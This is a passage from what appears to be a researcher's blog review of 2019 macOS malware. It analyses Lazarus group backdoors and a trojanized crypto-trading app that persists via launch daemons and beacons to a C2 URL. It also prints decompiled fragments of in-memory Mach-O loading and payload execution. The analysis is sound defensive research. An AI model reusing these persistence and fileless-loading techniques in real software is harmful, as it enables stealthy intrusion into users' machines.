The ability to remotely execute commands, clearly gives a remote attacker full and extensible control over the infected macOS system!
OSX.Yort.B is a close variant to the Lazarus group‚Äôs OSX.Yort.A; a backdoor that affords a remote attacker complete command and control over infected macOS systems.
‚ÄúMac Backdoor Linked to Lazarus Targets Korean Users‚Äù
‚ÄúLazarus Take 3: FlashUpdateCheck, Album.app‚Äù
In late October, Twitter user @cyberwar_15 uncovered a new Lazarus group backdoor, targeting macOS users.
#NorthKorea #Lazarus #XLS #MacOSÏó∞Ïù∏Ïã¨Î¶¨ÌÖåÏä§Ìä∏.xls6850189bbf5191a76761ab20f7c630efhttps://t.co/nDQKtzjufo a8096ddf8758a79fdf68753190c6216aC2 ÎèôÏùºhttps://t.co/SDIgyrrZv2https://t.co/u347K2ltoXhttps://t.co/MUfL28vtmB pic.twitter.com/lwjVfIeeSE‚Äî cyberwar15 (@cyberwar_15) October 22, 2019
#NorthKorea #Lazarus #XLS #MacOSÏó∞Ïù∏Ïã¨Î¶¨ÌÖåÏä§Ìä∏.xls6850189bbf5191a76761ab20f7c630efhttps://t.co/nDQKtzjufo a8096ddf8758a79fdf68753190c6216aC2 ÎèôÏùºhttps://t.co/SDIgyrrZv2https://t.co/u347K2ltoXhttps://t.co/MUfL28vtmB pic.twitter.com/lwjVfIeeSE
His tweet identified a malicious excel (xls) document, and a malicious application Album.app.
Though Lazarus group has previously utilized malicious ‚Äúmacro-laden‚Äù office documents to target macOS users (e.g.
OSX.Yort) is malicious excel document (as noted by TrendMicro) contains no macOS logic:
‚Ä¶thus is seems likely to assume that the malicious application (Album.app) is instead directly distributed to targets (perhaps as an email attachment).
As the application is unsigned, user‚Äôs would have to manually disable or work-around Gatekeeper:




$ codesign -dvv /Users/patrick/Downloads/yort_b/Album.app 
/Users/patrick/Downloads/yort_b/Album.app: code object is not signed at all
Thus, its unlikely many macOS users were infected ‚Ä¶though in a targeted APT operation, sometimes just one is enough!
Although the original version of Yort was not persisted, OSX.Yort.B is persisted as a launch agent.
Specifically, if the user is coerced into running the malicious application, Album.app, it will persistently install a launch agent; ~/Library/Launchagents/com.adobe.macromedia.plist.
Taking a peek at disassembly of the malicious application‚Äôs binary (Album.app/Contents/macOS/Flash Player), reveals an embedded property list and code that will both save out this plist, then launch it via launchctl load:
We can also dynamically observe this via our FileMonitor:
Of course, this persistence is readily detected by our BlockBlock tool:
By means of the com.adobe.macromedia.flash.plist file, the malware perists a binary: /Users/user/.FlashUpdateCheck (as specified via the Program key):
As the RunAtLoad key is set, macOS will automatically (re)start the .FlashUpdateCheck binary each time the user logs in.
Recall when the user runs the malicious Album.app it persists a hidden binary, .FlashUpdateCheck
We can observe this binary being dropped by Album.app:
The hidden .FlashUpdateCheck binary is basic backdoor, essentially identical to OSX.Yort (mt.dat) which we covered early in this blog post.
In their brief writeup on the malware, SentinelOne, notes this fact as well, stating that:
‚Äúresearch suggests that the payload is the same backdoor payload we described earlier this year‚Äù -SentinelOne
‚Äúresearch suggests that the payload is the same backdoor payload we described earlier this year‚Äù -SentinelOne
Our analysis confirms this (as does a quick look at the embedded strings):
In OSX.Yort.B, the Lazarus group attackers has changed a few strings, and removed various function names (to slightly complicate analysis).
‚Ä¶for example, in OSX.Yort.A the execute command function was aptyl named ‚ÄúReplyCmd‚Äù, while the file download command was named ‚ÄúReplyDown‚Äù.
In OSX.Yort.B, these functions remain unnamed.
As we detailed the capabilities of this backdoor above, we won‚Äôt (re)cover it again here.
However, the recall it supports ‚Äústandard‚Äù backdoor commands such as:
Armed with these capabilities, remote attacker can maintain full remote control over the infected macOS system!
Yet another Lazarus group creation (internally named macloader), this first-stage implant loader, can download and execute modules directly from memory!
‚ÄúNewly discovered Mac malware uses ‚Äúfileless‚Äù technique to remain stealthy‚Äù



Infection Vector: Trojanized (Trading) Application


Infection Vector: Trojanized (Trading) Application
Recently, Dinesh_Devadoss posted a tweet about another Lazarus group macOS trojan:

Another #Lazarus #macOS #trojan md5: 6588d262529dc372c400bef8478c2eechxxps://unioncrypto.vip/Contains code: Loads Mach-O from memory and execute it /  Writes to a file and execute it@patrickwardle @thomasareed pic.twitter.com/Mpru8FHELi‚Äî Dinesh_Devadoss (@dineshdina04) December 3, 2019
Another #Lazarus #macOS #trojan md5: 6588d262529dc372c400bef8478c2eechxxps://unioncrypto.vip/Contains code: Loads Mach-O from memory and execute it /  Writes to a file and execute it@patrickwardle @thomasareed pic.twitter.com/Mpru8FHELi
We‚Äôve noted that the Lazarus APT group has a propensity for targeting users or administrators of crypto-currency exchanges.
And their de facto method of infecting such targets is via fake crypto-currency companies and trading applications.
Here, yet again we see them utilizing this approach to infect their targets.
Specifically, they first created a (fake) crypto-currency trading platform, ‚ÄúUnion Trader Crypto‚Äù (unioncrypto.vip):
Querying VirusTotal with this IP address, we find a URL request that triggered a download of the malicious application (https://www.unioncrypto.vip/download/W6c2dq8By7luMhCmya2v97YeN):
Said application is delivered via a disk image, named UnionCryptoTrader.dmg
We can mount this disk image, via the hdiutil attach command:
It contains a single package: UnionCryptoTrader.pkg:
Via our ‚ÄúWhatsYourSign‚Äù application, it‚Äôs easy to see the UnionCryptoTrader.pkg package is unsigned:
‚Ä¶which means macOS will warn the user, if they attempt to open it:
Clearly, the Lazarus group is sticking with its successful attack vector (of targeting employees of crypto-currency exchanges with trojanized trading applications).
Taking a peek at the UnionCryptoTrader.pkg package, uncovers a postinstall script that will be executed at the end of the installation process:
The purpose of this script is to persistently install a launch daemon.
move a hidden plist (.vip.unioncrypto.plist) from the application‚Äôs Resources directory into /Library/LaunchDaemons
set it to be owned by root
move a hidden binary (.unioncryptoupdater) from the application‚Äôs Resources directory into /Library/UnionCrypto/
set it to be executable
We can passively observe this part of the installation via either our File or Process monitors:
Though installing a launch daemon requires root access, the installer will prompt the user for their credentials:
Once the installer completes, the binary unioncryptoupdater will both currently executing, and persistently installed:
Of course, BlockBlock will detect the launch daemon persistence attempt:
As noted, persistence is achieved via the vip.unioncrypto.plist launch daemon:
As the RunAtLoad key is set to true this instruct macOS to automatically launch the binary specified in the ProgramArguments array each time the infected system is rebooted.
As such /Library/UnionCrypto/unioncryptoupdater will be automatically (re) executed.
Installing a launch daemon (who‚Äôs plist and binary were both stored hidden in the application‚Äôs resource directory) again matches Lazarus groups modus operandi.
See Kaspersky‚Äôs writeup: ‚ÄúOperation AppleJeus: Lazarus hits cryptocurrency exchange with fake installer and macOS malware‚Äù


Capabilities: 1st-stage implant (in-memory module loader)
Ok, time to analyze the persisted unioncryptoupdater binary.
Via the file command we can ascertain its a standard macOS (64bit) binary:
The codesign utility shows us both it identifier (macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392) and the fact that it‚Äôs not signed with a valid code signing id, but rather adhoc (Signature=adhoc):
Running the strings utility (with the -a flag) reveals some interesting strings:
Strings such as IOPlatformSerialNumber and reference to the SystemVersion.plist likely indicate basic survey capabilities (to gather information about the infected system).
The reference to libcurl API (curl_easy_perform) and embedded url https://unioncrypto.vip/update indicate networking and/or command and control capabilities.
Opening a the binary (unioncryptoupdater) in a disassembler, shows the main function simply invoking a function named onRun:
Though rather long and involved we can break down its logic.
Builds a string consisting of the time and hardcode value (key?
): 12GWAPCT1F0I1S14

1sprintf(&var_130, "%ld", time(0x0));
2rax = sprintf(&var_1B0, "%s%s", &var_130, "12GWAPCT1F0I1S14");
Ok, so we‚Äôve got a fairly standard persistent 1st-stage implant which beacons to a remote server for (likely) a 2nd-stage fully-featured implant.
At this time, while the remote command & control server remains online, it simply it responding with a ‚Äú0‚Äù, meaning no payload is provided :(
As such, we must rely on static analysis methods for the remainder of our analysis.
However, the is one rather unique aspect of this 1st-stage implant: the ability to execute the received payload, directly from memory!
Looks take a closer look at how the malware implements this stealthy capability.
Recall that if the server responds with payload (and not a string "0"), the malware invokes the processUpdate function.
First the processUpdate decrypts said payload (via aes_decrypt_cbc), then invokes a function named load_from_memory.
The load_from_memory function first mmaps some memory (with protections: PROT_READ | PROT_WRITE | PROT_EXEC).
Then copies the decrypted payload into this memory region, before invoking a function named memory_exec2:
The memory_exec2 function invokes the Apple API NSCreateObjectFileImageFromMemory to create an ‚Äúobject file image‚Äù from a memory buffer (of a mach-O file).
Following this, the NSLinkModule method is called to link the ‚Äúobject file image‚Äù.
As the layout of an in-memory process image is different from its on disk-in image, one cannot simply copy a file into memory and directly execute it.
Instead, one must invoke APIs such as NSCreateObjectFileImageFromMemory and NSLinkModule (which take care of preparing the in-memory mapping and linking).
Once the malware has mapped and linked the downloaded payload, it invokes a function named find_macho which appears to search the memory mapping for MH_MAGIC_64, the 64-bit ‚Äúmach magic number‚Äù in the mach_header_64 structure (0xfeedfacf):
Once the find_macho method returns, the malware begins parsing the in-memory mach-O file.
It appears to be looking for the address of LC_MAIN load command (0x80000028):
1if (*(int32_t *)rcx == 0x80000028) goto loc_100006ac7;
For an in-depth technical discussion of parsing mach-O files, see: ‚ÄúParsing Mach-O Files‚Äù.
The LC_MAIN load command contains information such as the entry point of the mach-O binary (for example, offset 18177 for the unioncryptoupdater binary):
The malware then retrieves the offset of the entry point (found at offset 0x8 within the LC_MAIN load command), sets up some arguments, then jumps to this address:
1//rcx points to the `LC_MAIN` load command
2r8 = r8 + *(rcx + 0x8);
3...
4
5//invoke payload's entry point!
6rax = (r8)(0x2, &var_40, &var_48, &var_50, r8);
Pure in-memory execution of a remotely downloaded payload.
In 2015, at BlackHat I discussed this method of in-memory file execution as a means to increase stealth and complicate forensics (See: ‚ÄúWriting Bad @$$ Malware for OS X‚Äù):
‚Ä¶kinda neat to see it (finally) show up in macOS malware in the wild!
For more details on in-memory code execution in macOS, see:
@prsecurity_ tweeted also just tweeted about creating a simple PoC:

If you want to play with in-memory loading of Mach-Os based on this method, I put together a simple PoC: https://t.co/IP3JhRyf7h, just run make.credit @objective_see and Apple OpenSource‚Äî prsecurity_ (@prsecurity_) December 4, 2019
If you want to play with in-memory loading of Mach-Os based on this method, I put together a simple PoC: https://t.co/IP3JhRyf7h, just run make.credit @objective_see and Apple OpenSource
Former #OBTS speaker Felix Seele (@c1truz_) noted that the (in)famous InstallCore adware also (ab)used the NSCreateObjectFileImageFromMemory and NSLinkModule APIs to achieve in-memory execution.
Interestingly, the malware has a ‚Äúbackup‚Äù plan if the in-memory code execution fails.
Specifically if load_from_memory does not return 0 (success) it will write out the received payload to /tmp/updater and then execute it via a call to system:
Always good to handle error conditions and have a plan B!
Lazarus group continues to target macOS users with ever evolving capabilities.
This sample, pushes the envelope with the ability to remotely download and execute payloads directly from memory!
This blog post provided a comprehensive technical analysis of the new mac malware of 2019.
However as previously noted, we did not cover adware or malware from previous years.
Of course, this is not to say such items are unimportant.
As such, here we include a list of other items and for the interested reader, and links to detailed writeups.
Chances are, if an Apple user tells you their Mac is infected, it‚Äôs likely adware.
Over the years, Mac adware has become ever more prolific as hackers seeks to financially ‚Äúbenefit‚Äù from the popularity of Cupertino‚Äôs devices.
2019 saw a variety of new adware, plus various known samples continuing to evolve.
Some of the most notable adware-related events from 2019 include:
üëæ OSX.Dok

In January, SentinelOne discovered that OSX.Dok was back, and ‚Äúactively infecting (new) victims‚Äù.
Writeup: ‚ÄúMac Malware OSX.Dok is Back, Actively Infecting Victims‚Äù
üëæ OSX.Pirrit

The ever prolific Pirrit adware continued to involve in 2019.
In March, we analyzed a sample (compiled as python bytecode) which utilized AppleScript to inject malicious JavScript into browser pages.
Writeup: ‚ÄúMac Adware, √† la Python‚Äù
üëæ OSX.Tarmac

A well known piece of mac adware OSX.Shlayer was recently observed installing a new piece of Mac adware.
Dubbed OSX.Tarmac this new adware implements a variety of tricks to complicate detection and analysis.
Writeup: ‚ÄúOSX/Shlayer new Shurprise‚Ä¶ unveiling OSX/Tarmac‚Äù
undetected by all the anti-virus engines on VirusTotal, OSX.NewTab appears to be a fairly standard piece of macOS adware (that appears to inject code into browser sessions for ‚Äúad impressions‚Äù).
üëæ OSX.CrescentCore
Masquerading as Adobe Flash Installer, CrescentCore attempts to installing other (potentially) unwanted software on victim machines.
Interestingly, by design it will not infect systems running 3rd-party AV/security tools nor systems running within a VM.
Writeup: ‚ÄúOSX/CrescentCore: Mac malware designed to evade antivirus‚Äù
Thanks for joining our ‚Äújourney‚Äù as we wandered through the macOS malware of 2019.
Looking forward, maybe we‚Äôll see a drop in malware affecting the latest version of macOS (Catalina), due to its stringent notarization requirements ‚Ä¶though word on the street is it‚Äôs already bypassed:
Support my tools & writing on patreon :)
